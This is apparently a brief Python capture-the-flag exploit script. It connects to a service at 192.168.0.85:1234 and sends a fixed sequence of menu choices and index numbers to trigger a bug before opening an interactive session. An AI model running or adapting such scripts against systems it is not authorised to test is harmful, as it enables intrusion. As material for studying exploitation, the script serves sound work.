from PwnIOI import *

s = IOI(['192.168.0.85',1234])
def add(index):
  s.read_until('> ')
  s.write('2\n')
  s.read_until('Number> ')
  s.write(str(index)+'\n')

add(3)
add(4)
for i in xrange(15):
  add(2)
for i in xrange(9):
  add(1)
s.interact()
